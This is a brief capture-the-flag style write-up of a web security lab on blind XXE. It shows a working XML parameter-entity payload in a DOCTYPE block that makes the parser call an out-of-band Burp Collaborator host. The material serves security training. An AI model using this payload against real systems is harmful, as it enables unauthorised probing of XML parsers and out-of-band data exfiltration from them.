# Lab: Blind XXE with out-of-band interaction via XML parameter entities

>This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.

>To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

### Observations
My burp collaborator instance: `wkkdpapekbhuwqtmlrka36my0p6fu4.burpcollaborator.net`

I did some reading here to learn what XML parameter entities are https://www.w3resource.com/xml/parameter-entities.php


So it looks that I can create a payload something like below, and then reference it with %xxe; 

`<!ENTITY % xxe "http://wkkdpapekbhuwqtmlrka36my0p6fu4.burpcollaborator.net" >`

We are told that we cannot make this request to the collaborator from within the "stock check" tags of XML.

### Solution
Instead, we will execute our XXE right after the XML declaration statement. So our payload looks like this:

`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://wkkdpapekbhuwqtmlrka36my0p6fu4.burpcollaborator.net"> %xxe; ]>`

This works because we are executing our XXE within the DTD itself (the doctype block).

Send the request and the lab is solved!